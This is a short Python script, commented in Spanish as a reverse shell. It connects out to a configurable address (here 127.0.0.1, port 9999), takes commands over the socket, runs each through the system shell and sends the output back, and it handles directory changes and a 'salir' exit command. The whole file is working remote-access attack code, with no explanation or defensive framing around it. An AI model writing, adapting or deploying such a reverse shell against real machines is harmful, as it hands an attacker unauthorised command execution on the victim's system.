#Esto es un reverse shell
import socket,subprocess,os
puerto = 9999
direccion = "127.0.0.1"
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((direccion,puerto))
while True:
    mensaje = s.recv(1024).decode()
    if "salir" in mensaje:
        ad = "Se ha terminado la conexion, cerrando la terminal...\n"
        s.sendall(ad.encode())
        subprocess.run(["sleep", "2"])
        break

    elif "cd" in mensaje:
        try:
            lista = mensaje.split()
            lista.pop(0)
            os.chdir(lista[0])
            ad = (f"Ahora se encuentra en: {os.getcwd()}\n")
            s.sendall(ad.encode())
            continue
        except FileNotFoundError:
            ad = ("El directorio no fue encontrado o no existe.\n")
            s.sendall(ad.encode())
            continue
    
    comando = subprocess.run([f"{mensaje}"],shell=True, capture_output=True,text=True)
    completo = comando.stdout + comando.stderr
    s.sendall(completo.encode())
s.close()